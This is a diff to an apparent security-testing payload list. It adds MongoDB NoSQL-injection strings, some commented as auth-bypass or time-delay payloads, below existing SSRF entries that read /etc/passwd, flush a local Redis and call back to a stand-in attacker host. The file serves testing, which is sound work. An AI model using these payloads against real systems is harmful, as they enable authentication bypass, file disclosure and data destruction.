@@ -59,3 +59,17 @@ ssrf:
   - "file:///etc/passwd"
   - "gopher://localhost:6379/_FLUSHALL"
   - "http://attacker.example/ssrf-callback"
+
+nosql_injection:
+  # MongoDB-style operator injection. Some of these will short-circuit
+  # the WHERE clause (auth bypass) on a vulnerable Mongo backend.
+  - "true, $where: '1 == 1'"
+  - "{\"$ne\": null}"
+  - "{\"$ne\": \"\"}"
+  - "{\"$gt\": \"\"}"
+  - "{\"$regex\": \".*\"}"
+  - "{\"$where\": \"sleep(5000) || true\"}"
+  - "'||'1'=='1"
+  - ';return true;var x="'
+  - "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
+  - "{\"$or\": [{}, {\"x\": 1}]}"
